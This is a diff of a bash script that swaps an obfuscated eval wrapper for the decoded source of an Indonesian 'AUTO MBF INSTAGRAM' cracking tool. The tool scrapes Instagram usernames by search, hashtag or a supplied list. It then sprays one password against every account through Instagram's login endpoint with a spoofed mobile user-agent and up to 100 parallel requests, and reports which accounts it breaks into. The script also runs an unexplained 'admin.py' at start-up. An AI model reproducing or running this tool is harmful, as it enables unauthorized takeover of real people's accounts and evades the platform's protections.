@@ -1,3 +1,109 @@
-z="
-";DIz='ions';Sz='nta=';DEz='o -e';CHz=' | g';HCz='37m';uHz='llow';KLz='u ge';wCz='get ';cHz='[ ! ';GLz='e" ]';TJz='orig';VHz='rm h';qz='for ';LDz='/web';ZMz='ead%';Iz='yell';yFz='ram.';FCz='sern';vIz='txt ';QDz='h/?c';IMz='ckpo';JDz='gram';OMz='@$i ';bHz='list';LLz='t it';OIz='h';TMz='(';WCz='put ';YLz='/" -';hGz='(< h';SDz='xt=b';uJz='WebK';hCz='t in';DHz='rep ';RDz='onte';YEz='] ${';sLz='~ "f';LCz='ag\e';gBz='t';RLz='lue}';eMz='=0))';ICz='[2].';SCz=' $pu';yJz='HTML';JKz='ome/';DMz=' cra';gJz='ux; ';eEz='.${w';TBz='mand';pEz='s://';KIz='p 1';VIz='/acc';yDz='< ta';uCz='name';wGz='xarg';QEz=''\'' pa';tJz='pple';JFz='Not ';ZFz=' "$g';OBz='ll b';gIz='.*" ';RKz='537.';bKz='with';kGz=' ; e';ZJz='n/" ';MFz=']; t';SKz='36" ';GKz='wser';yz='-v $';RFz='${re';gz='r';lFz='[].n';TIz=' -sL';KCz='asht';XGz='ag)';PJz='csrf';MJz='-H "';qGz='(cat';PMz=': ${';aMz='t));';nDz='37m]';SIz='curl';gEz=';;';yEz='{has';hIz='| cu';YGz='"[${';MCz='7m';tCz='User';EMz='ck${';MGz='e us';IJz='logi';mJz='NG S';cLz='rope';cJz='Mozi';sz=' "${';VGz='sult';aKz='ted-';JMz='int_';Mz=''\''';GCz='ame\';tLz='alse';WIz='ount';SBz=' com';cEz='acki';fDz=''\'' > ';pDz='lah ';KEz='suka';sEz='agra';LJz=' \';Pz='[1;3';pz='l" )';WGz=' > h';oCz='31m+';OEz='rack';lKz='{pas';WDz='=${a';RJz='n}" ';eCz='rget';pGz='in $';eLz='"og:';FDz='s "h';aHz='u 3';VBz='pt i';EFz='if [';xKz=' cut';fGz='ello';aJz='-age';dGz='   :';aLz=''\''<me';AFz='htag';jEz='hash';YKz='x-re';iLz=' con';vJz='it/5';nJz='M-G9';NFz='hen';wJz='37.3';BHz='l -s';LIz='bash';OKz='bile';MKz='3.13';AGz='com/';kHz='d${w';PBz='y ty';MMz='}?${';lBz='-*';XKz='}" \';KGz='dupl';BKz='ke G';KKz='44.0';eDz='user';uLz='" ]]';UJz='in: ';XJz='rer:';SJz='\';fIz='ken=';QIz='toke';HHz='eNam';FHz='alte';iBz='n';nFz='shor';PCz='ordl';oHz='}] T';CMz='d to';JGz='ing ';bFz='| jq';lz='cies';FKz='gBro';XIz='s/lo';jJz='6.0.';fJz='(Lin';NEz='rd C';gFz='e_ha';WLz='//in';Ez='gree';Wz='whit';IGz='emov';nGz='e[31';UMz=' $(c';MLz='! ${';GBz='echo';lMz='ck.s';KMz='requ';THz=' &';Cz='1;31';RBz=' the';JBz=' : n';BIz='enu';IBz=' "$i';uz='"';BEz='-l ;';ADz='ask';xCz=': \e';hEz='2) #';QGz='d}#$';kJz='1; S';YFz='else';WKz='oken';IKz=' Chr';SGz='$(so';xJz='6 (K';cKz=': XM';vLz='; th';Zz='cd d';jMz=')';OHz='cut ';QCz='ist\';dLz='rty=';PLz='$pas';ALz='"," ';kBz='----';vGz='g | ';QKz='ari/';pBz='TAGR';rBz='*---';fz='clea';lIz='d ";';ULz='(cur';nLz='" " ';gCz=' $op';TCz='"╭─C';HFz='~ "P';iKz='=${i';LFz='d" ]';RGz='tag$';DLz='ogin';wLz='en';jIz=' "="';tGz='o';bIz=' gre';Az='red=';VCz='e In';PGz='tag ';pIz='te()';JCz='1m#h';VKz=' ${t';HGz='}] R';fFz='.edg';qKz=' -o ';sIz='s -c';vz='do';kEz='tag';DKz=') Sa';mEz='sX G';iz='t=50';rFz=' '\''{p';az='ebo';GJz='ccou';NJz='cook';EJz='am.c';vKz=':" -';Qz='4m'\''';LBz='nsta';fCz='case';HBz=' >&2';CGz='0"/"';sHz='st  ';NHz='2 | ';OLz='i - ';eGz=' ${y';GFz='et =';VEz='ow}!';KDz='.com';UKz='ken:';lLz=''\'' | ';kFz='dges';lEz='get=';MIz=' bru';LEz='n Pa';Hz='32m'\''';mIz='1)';XCz='read';qBz='AM';LKz='.240';EEz='e}us';iIz='t -d';yIz='"htt';NBz=' - i';xBz='ck T';wz='comm';CKz='ecko';kIz=' -f2';RHz='f1 >';WHz='ag r';Rz='mage';REz='ss';qJz='ld/M';VLz='XGET';TFz='g no';YBz='exit';eJz='5.0 ';tIz=' coo';qLz='$log';fLz='desc';UFz='t fo';WBz='ll $';bCz='opt';dHz='-e $';eHz=' ]];';AIz='ng m';CEz=' ech';UDz='ed&q';cBz='$red';yKz=' -d ';LHz='d "@';aGz='}] J';IDz='ww.i';CFz='_a=1';Yz='37m'\''';dJz='lla/';jHz='foun';gMz='brut';iMz='i" &';qCz='7m] ';wDz='lect';rLz='in =';ZGz='=${w';ILz='te}]';XHz='esul';yGz=' 100';WFz='{whi';NDz='rch/';TDz='lend';NIz='te.s';lHz='$lis';kMz='rm t';mCz='[37m';bJz='nt: ';YHz='fi';cMz='hrea';mHz='t > ';SLz='e}- ';pKz='grep';mFz='ode.';tz='[@]}';bLz='ta p';BBz='dev/';BJz='/www';DCz='n \e';tDz=' : \';VJz='m" \';VDz='uery';PEz='  : ';qFz=' awk';ZBz='}';QJz='n=${';pLz=' [[ ';sCz='kan ';QFz='g : ';CBz='null';KJz='ax/"';sFz='rint';AKz=', li';kDz='m[\e';iGz='ag w';Uz='cyan';MBz='lled';FEz='er")';BCz='nggu';lJz='AMSU';ZCz='"╰─•';EGz=' res';aCz='> " ';BFz='}/?_';TEz='hite';gDz='targ';iJz='oid ';EHz='-o "';OJz='ie: ';yCz='3m'\'' ';pHz='otal';qDz='Targ';HLz='n}+$';Tz='1;35';hKz='-d "';Oz='='\''\e';jz='depe';Xz='e='\''\';iFz='_med';UHz='wait';gLz='ript';CLz='[ $l';Kz='\e[1';ZHz='3) #';SFz='d}Ha';PKz=' Saf';bEz='t Cr';NCz='[3].';cFz=' -r ';EKz='msun';TLz=': "$';JIz='slee';jFz='ia.e';dFz=''\''.[]';nBz=' MBF';DFz='")';WEz='${wh';HJz='nts/';nKz=' $ur';PDz='earc';ELz=' =~ ';uFz='tps:';FGz='ult';IEz=';37m';cDz='[].u';dKz='LHtt';aBz='done';SMz='oint';PHz='-d '\''';OGz='rom ';jBz=' "*-';rIz='url=';IFz='age ';SHz='> ta';vEz='plor';oFz='tcod';JEz='] Ma';Vz='6m'\''';AJz='ps:/';OFz='"$ha';UCz='hoos';rJz='MB29';lCz='$'\''\e';MEz='sswo';jDz='e[37';GEz='$'\''[\';HKz='/4.0';bz='pyth';sBz='---*';dCz='h ta';qIz='{';HMz='"che';BGz='p/"$';BLz='-f1)';DJz='tagr';xDz=''\'''\''$(';JJz='n/aj';NMz='e}] ';mBz='AUTO';wHz='-l)';dMz='d++=';ABz='i >/';Lz=';33m';AMz=' ${r';cGz='h Ta';IHz='e.*"';xLz='}] @';ez='n.py';kKz='rd=$';vDz='$col';oz='"cur';cCz='touc';DGz='}'\'' >';XMz='((th';TKz='x-cs';lGz='cho ';mGz='-e "';Fz='n='\''\';sJz='M) A';Dz='m'\''';oBz=' INS';fMz=' && ';EIz=' are';UBz=' : a';QLz='s${b';CIz='}opt';RCz=''\'''\'''\''';hLz='ion"';cIz='p -o';WJz='refe';PFz='shta';AHz=' cur';TGz='rt -';eIz='rfto';jKz='}&pa';uGz=' $ta';iEz='u 2';EDz='rl -';AEz=' wc ';aIz='/" |';Bz=''\''\e[';uEz='m/ex';jLz='tent';ACz='t Me';XEz='ite}';tBz='$whi';nCz='[\e[';qEz='www.';ZIz='ajax';rz='i in';XBz='i -y';ZEz='red}';aFz='et" ';DBz=' 2>&';QMz='n}ch';wBz=' Cra';xz='and ';hz='limi';HIz='the ';IIz='menu';YIz='gin/';VMz='at t';LGz='icat';sGz='); d';cz='on2 ';hJz='Andr';ECz='1m@u';ZKz='ques';rCz='Masu';Jz='ow='\''';NLz='e}@$';wFz='w.in';Nz='blue';yLz='$i -';XDz='sk}"';dEz='ng..';NKz='3 Mo';pJz=' Bui';bBz=' -e ';ZLz='L | ';rKz='"aut';gGz='w}"$';nEz='ET "';fHz='"${r';YCz=' -p ';gKz='" \';iCz='1) #';lDz='[31m';YDz=' | j';tEz='m.co';eKz='pReq';JLz='w}Yo';sKz='hent';ZDz='q -r';tKz='ed.*';KFz='Foun';hMz='e "$';oEz='http';iDz=' $'\''\';XLz='${i}';SEz='"${w';rEz='inst';QHz='"'\'' -';KBz='ot i';hHz='ile ';aDz=' '\''.u';eBz='hsam';KHz='ut -';FIz=' not';GHz='rnat';FFz='[ $g';oGz='m-\e';jGz='c -l';RMz='eckp';fKz='uest';mz='=( "';dz='admi';nHz='et';PIz='esac';gHz='ed}f';vFz='//ww';xEz='gs/$';bGz='umla';DDz='$(cu';BDz='coll';hBz='$cya';FMz='e}"';bMz=' ((t';vBz='[1].';aEz='Star';ODz='tops';sDz='    ';wKz='f2 |';XFz='te}"';qHz=' you';EBz='1 ||';Gz='e[1;';fBz='p.tx';VFz='und$';OCz='1m$W';eFz='.has';GMz='$url';xGz='s -P';yHz=' wro';GDz='ttps';yBz='arge';CCz='naka';kLz='=".*';UGz='u re';CJz='.ins';FJz='om/a';rGz=' has';oIz='tion';MHz='" -f';FLz='"tru';xHz='*) #';mLz='f4 |';HEz='31m-';pFz='e'\'' |';GGz='!${w';kz='nden';oDz=' Jum';uBz='te'\'''\''';rHz='r li';nz='jq" ';JHz=' | c';bDz='sers';vHz='}"$(';xFz='stag';jCz=' men';rDz='et  ';mDz='=\e[';BMz='aile';HDz='://w';fEz='}"';tHz='${ye';tFz=' "ht';nIz='func';iHz='not ';dDz='ser.';RIz='n=$(';WMz='t); ';GIz=' on ';MDz='/sea';LMz='ired';YMz='=thr';uKz='" | ';UEz='}[${';pCz='\e[3';YJz=' htt';kCz='u 1';uDz='33m'\''';oJz='30T1';dBz='cat ';vCz=' Tar';xIz='OST ';dIz=' "cs';hDz='et)';oLz='elif';QBz='ping';wEz='e/ta';uIz='kie.';mKz='s}")';oKz='l | ';hFz='g_to';NGz='er f';UIz='i "h';FBz=' {';wIz='-X P';CDz='ect=';
-eval "$Az$Bz$Cz$Dz$z$Ez$Fz$Gz$Hz$z$Iz$Jz$Kz$Lz$Mz$z$Nz$Oz$Pz$Qz$z$Rz$Sz$Bz$Tz$Dz$z$Uz$Oz$Pz$Vz$z$Wz$Xz$Gz$Yz$z$Zz$az$z$bz$cz$dz$ez$z$fz$gz$z$hz$iz$z$jz$kz$lz$mz$nz$oz$pz$z$qz$rz$sz$jz$kz$lz$tz$uz$z$vz$z$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$FBz$z$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$LBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$LBz$WBz$XBz$uz$z$YBz$z$ZBz$z$aBz$z$Zz$az$z$GBz$bBz$cBz$z$dBz$eBz$fBz$gBz$z$GBz$bBz$hBz$iBz$z$GBz$jBz$kBz$kBz$kBz$kBz$kBz$kBz$kBz$lBz$z$mBz$nBz$oBz$pBz$qBz$z$rBz$kBz$kBz$kBz$kBz$kBz$kBz$sBz$uz$z$GBz$bBz$tBz$uBz$Mz$z$vBz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$Pz$ECz$FCz$GCz$Gz$HCz$z$ICz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$Pz$JCz$KCz$LCz$Pz$MCz$z$NCz$wBz$xBz$yBz$ACz$BCz$CCz$DCz$Pz$OCz$PCz$QCz$Gz$HCz$z$RCz$z$GBz$SCz$TCz$UCz$VCz$WCz$uz$z$XCz$YCz$ZCz$aCz$bCz$z$cCz$dCz$eCz$z$fCz$gCz$hCz$z$iCz$jCz$kCz$z$XCz$YCz$lCz$mCz$nCz$oCz$pCz$qCz$rCz$sCz$tCz$uCz$vCz$wCz$xCz$Pz$yCz$ADz$z$BDz$CDz$DDz$EDz$FDz$GDz$HDz$IDz$LBz$JDz$KDz$LDz$MDz$NDz$ODz$PDz$QDz$RDz$SDz$TDz$UDz$VDz$WDz$XDz$YDz$ZDz$aDz$bDz$cDz$dDz$eDz$uCz$fDz$gDz$hDz$z$GBz$iDz$jDz$kDz$lDz$mDz$nDz$oDz$pDz$qDz$rDz$sDz$sDz$tDz$Gz$uDz$vDz$wDz$xDz$yDz$eCz$AEz$BEz$CEz$DEz$sz$Wz$EEz$FEz$z$XCz$YCz$GEz$Gz$HEz$Kz$IEz$JEz$KEz$LEz$MEz$NEz$OEz$PEz$Kz$Lz$QEz$REz$z$GBz$bBz$SEz$TEz$UEz$Iz$VEz$WEz$XEz$YEz$ZEz$aEz$bEz$cEz$dEz$eEz$TEz$fEz$z$gEz$z$hEz$jCz$iEz$z$XCz$YCz$lCz$mCz$nCz$oCz$pCz$qCz$rCz$sCz$tCz$uCz$vCz$wCz$xCz$Pz$yCz$jEz$kEz$z$lEz$DDz$EDz$mEz$nEz$oEz$pEz$qEz$rEz$sEz$tEz$uEz$vEz$wEz$xEz$yEz$AFz$BFz$CFz$DFz$z$EFz$FFz$GFz$HFz$IFz$JFz$KFz$LFz$MFz$NFz$z$GBz$bBz$OFz$PFz$QFz$RFz$SFz$PFz$TFz$UFz$VFz$WFz$XFz$z$YBz$z$YFz$z$GBz$ZFz$aFz$bFz$cFz$dFz$eFz$AFz$fFz$gFz$PFz$hFz$iFz$jFz$kFz$lFz$mFz$nFz$oFz$pFz$qFz$rFz$sFz$tFz$uFz$vFz$wFz$xFz$yFz$AGz$BGz$CGz$DGz$EGz$FGz$z$GBz$bBz$SEz$TEz$UEz$ZEz$GGz$TEz$HGz$IGz$JGz$KGz$LGz$MGz$NGz$OGz$PGz$RFz$QGz$jEz$RGz$WFz$XFz$SGz$TGz$UGz$VGz$WGz$KCz$XGz$z$GBz$bBz$YGz$ZEz$ZGz$TEz$aGz$bGz$cGz$eCz$sDz$sDz$dGz$eGz$fGz$gGz$hGz$KCz$iGz$jGz$kGz$lGz$mGz$WEz$XEz$eDz$DFz$z$XCz$YCz$GEz$nGz$oGz$mCz$JEz$KEz$LEz$MEz$NEz$OEz$PEz$Kz$Lz$QEz$REz$z$GBz$bBz$SEz$TEz$UEz$Iz$VEz$WEz$XEz$YEz$ZEz$aEz$bEz$cEz$dEz$eEz$TEz$fEz$z$qz$PGz$pGz$qGz$rGz$AFz$sGz$tGz$z$GBz$uGz$vGz$wGz$xGz$yGz$AHz$BHz$CHz$DHz$EHz$FHz$GHz$HHz$IHz$JHz$KHz$LHz$MHz$NHz$OHz$PHz$QHz$RHz$SHz$eCz$THz$z$aBz$z$UHz$z$VHz$KCz$WHz$XHz$gBz$z$YHz$z$gEz$z$ZHz$jCz$aHz$z$XCz$YCz$lCz$mCz$nCz$oCz$pCz$qCz$rCz$sCz$tCz$uCz$vCz$wCz$xCz$Pz$yCz$bHz$z$EFz$cHz$dHz$bHz$eHz$RBz$iBz$z$GBz$bBz$fHz$gHz$hHz$iHz$jHz$kHz$TEz$fEz$z$YBz$z$YFz$z$dBz$lHz$mHz$gDz$nHz$z$GBz$bBz$YGz$ZEz$ZGz$TEz$oHz$pHz$qHz$rHz$sHz$PEz$tHz$uHz$vHz$yDz$eCz$AEz$wHz$z$XCz$YCz$GEz$nGz$oGz$mCz$JEz$KEz$LEz$MEz$NEz$OEz$PEz$Kz$Lz$QEz$REz$z$GBz$bBz$SEz$TEz$UEz$Iz$VEz$WEz$XEz$YEz$ZEz$aEz$bEz$cEz$dEz$eEz$TEz$fEz$z$YHz$z$gEz$z$xHz$yHz$AIz$BIz$z$GBz$bBz$SEz$TEz$CIz$DIz$EIz$FIz$GIz$HIz$IIz$uz$z$JIz$KIz$z$fz$gz$z$LIz$MIz$NIz$OIz$z$PIz$z$QIz$RIz$SIz$TIz$UIz$GDz$HDz$IDz$LBz$JDz$KDz$VIz$WIz$XIz$YIz$ZIz$aIz$bIz$cIz$dIz$eIz$fIz$gIz$hIz$iIz$jIz$kIz$JHz$KHz$lIz$MHz$mIz$z$nIz$oIz$MIz$pIz$qIz$z$rIz$DDz$EDz$sIz$tIz$uIz$vIz$wIz$xIz$yIz$AJz$BJz$CJz$DJz$EJz$FJz$GJz$HJz$IJz$JJz$KJz$LJz$z$MJz$NJz$OJz$PJz$QIz$QJz$QIz$RJz$SJz$z$MJz$TJz$UJz$oEz$pEz$qEz$rEz$sEz$tEz$VJz$z$MJz$WJz$XJz$YJz$AJz$BJz$CJz$DJz$EJz$FJz$GJz$HJz$IJz$ZJz$SJz$z$MJz$eDz$aJz$bJz$cJz$dJz$eJz$fJz$gJz$hJz$iJz$jJz$kJz$lJz$mJz$nJz$oJz$pJz$qJz$rJz$sJz$tJz$uJz$vJz$wJz$xJz$yJz$AKz$BKz$CKz$DKz$EKz$FKz$GKz$HKz$IKz$JKz$KKz$LKz$MKz$NKz$OKz$PKz$QKz$RKz$SKz$SJz$z$MJz$TKz$eIz$UKz$VKz$WKz$XKz$z$MJz$YKz$ZKz$aKz$bKz$cKz$dKz$eKz$fKz$gKz$z$hKz$eDz$uCz$iKz$jKz$MEz$kKz$lKz$mKz$z$IJz$RIz$GBz$nKz$oKz$pKz$qKz$rKz$sKz$LGz$tKz$uKz$OHz$hKz$vKz$wKz$xKz$yKz$ALz$BLz$z$EFz$CLz$DLz$ELz$FLz$GLz$MFz$NFz$z$GBz$bBz$YGz$Ez$HLz$WFz$ILz$eGz$fGz$JLz$KLz$LLz$MLz$Nz$UEz$Wz$NLz$OLz$PLz$QLz$RLz$YEz$Wz$SLz$bKz$TLz$ULz$BHz$VLz$tFz$uFz$WLz$xFz$yFz$AGz$XLz$YLz$ZLz$pKz$qKz$aLz$bLz$cLz$dLz$eLz$fLz$gLz$hLz$iLz$jLz$kLz$lLz$OHz$PHz$QHz$mLz$xKz$yKz$nLz$BLz$z$oLz$pLz$qLz$rLz$sLz$tLz$uLz$vLz$wLz$z$GBz$bBz$YGz$ZEz$GGz$TEz$xLz$yLz$AMz$gHz$BMz$CMz$DMz$EMz$Wz$FMz$z$oLz$pLz$GMz$ELz$HMz$IMz$JMz$KMz$LMz$uLz$vLz$wLz$z$GBz$bBz$YGz$Uz$MMz$Wz$NMz$OMz$WEz$XEz$PMz$Ez$QMz$RMz$SMz$WEz$XEz$uz$z$YHz$z$ZBz$z$TMz$z$qz$rz$UMz$VMz$yBz$WMz$vz$z$XMz$XCz$YMz$ZMz$hz$aMz$bMz$cMz$dMz$eMz$fMz$UHz$z$gMz$hMz$iMz$z$aBz$z$UHz$z$jMz$z$kMz$yBz$gBz$z$LIz$DMz$lMz$OIz"
+# Decrypt By X - MrG3P5
+
+red='\e[1;31m'
+green='\e[1;32m'
+yellow='\e[1;33m'
+blue='\e[1;34m'
+magenta='\e[1;35m'
+cyan='\e[1;36m'
+white='\e[1;37m'
+cd debo
+python2 admin.py
+clear
+limit=50
+dependencies=( "jq" "curl" )
+for i in "${dependencies[@]}"
+do
+command -v $i >/dev/null 2>&1 || {
+echo >&2 "$i : not installed - install by typing the command : apt install $i -y"
+exit
+}
+done
+cd debo
+echo -e $red
+cat hsamp.txt
+echo -e $cyan
+echo "*------------------------------*
+AUTO MBF INSTAGRAM
+*------------------------------*"
+echo -e $white'''
+[1]. Crack Target Menggunakan \e[1;31m@username\e[1;37m
+[2]. Crack Target Menggunakan \e[1;31m#hashtag\e[1;37m
+[3]. Crack Target Menggunakan \e[1;31m$Wordlist\e[1;37m
+'''
+echo $pu"╭─Choose Input "
+read -p "╰─•> " opt
+touch target
+case $opt in
+1) # menu 1
+read -p $'\e[37m[\e[31m+\e[37m] Masukan Username Target : \e[1;33m' ask
+collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
+echo $'\e[37m[\e[31m=\e[37m] Jumlah Target           : \e[1;33m'$collect''$(< target wc -l ; echo -e "${white}user")
+read -p $'[\e[1;31m-\e[1;37m] Masukan Password Crack  : \e[1;33m' pass
+echo -e "${white}[${yellow}!${white}] ${red}Start Cracking...${white}"
+;;
+2) # menu 2
+read -p $'\e[37m[\e[31m+\e[37m] Masukan Username Target : \e[1;33m' hashtag
+get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
+if [[ $get =~ "Page Not Found" ]]; then
+echo -e "$hashtag : ${red}Hashtag not found${white}"
+exit
+else
+echo "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
+echo -e "${white}[${red}!${white}] Removing duplicate user from tag ${red}#$hashtag${white}"$(sort -u result > hashtag)
+echo -e "[${red}=${white}] Jumlah Target           : ${yellow}"$(< hashtag wc -l ; echo -e "${white}user")
+read -p $'[\e[31m-\e[37m] Masukan Password Crack  : \e[1;33m' pass
+echo -e "${white}[${yellow}!${white}] ${red}Start Cracking...${white}"
+for tag in $(cat hashtag); do
+echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
+done
+wait
+rm hashtag result
+fi
+;;
+3) # menu 3
+read -p $'\e[37m[\e[31m+\e[37m] Masukan Username Target : \e[1;33m' list
+if [[ ! -e $list ]]; then
+echo -e "${red}file not found${white}"
+exit
+else
+cat $list > target
+echo -e "[${red}=${white}] Total your list    : ${yellow}"$(< target wc -l)
+read -p $'[\e[31m-\e[37m] Masukan Password Crack  : \e[1;33m' pass
+echo -e "${white}[${yellow}!${white}] ${red}Start Cracking...${white}"
+fi
+;;
+*) # wrong menu
+echo -e "${white}options are not on the menu"
+sleep 1
+clear
+bash brute.sh
+esac
+token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
+function brute(){
+url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
+-H "cookie: csrftoken=${token}" \
+-H "origin: https://www.instagram.com" \
+-H "referer: https://www.instagram.com/accounts/login/" \
+-H "user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930T1 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36" \
+-H "x-csrftoken: ${token}" \
+-H "x-requested-with: XMLHttpRequest" \
+-d "username=${i}&password=${pass}")
+login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
+if [[ $login =~ "true" ]]; then
+echo -e "[${green}+${white}] ${yellow}You get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -sXGET "https://instagram.com/${i}/" -L | grep -o '<meta property="og:description" content=".*' | cut -d '"' -f4 | cut -d " " -f1)
+elif [[ $login =~ "false" ]]; then
+echo -e "[${red}!${white}] @$i - ${red}failed to crack${white}"
+elif [[ $url =~ "checkpoint_required" ]]; then
+echo -e "[${cyan}?${white}] @$i ${white}: ${green}checkpoint${white}"
+fi
+}
+(
+for i in $(cat target); do
+((thread=thread%limit)); ((thread++==0)) && wait
+brute "$i" &
+done
+wait
+)
+rm target
+bash crack.sh
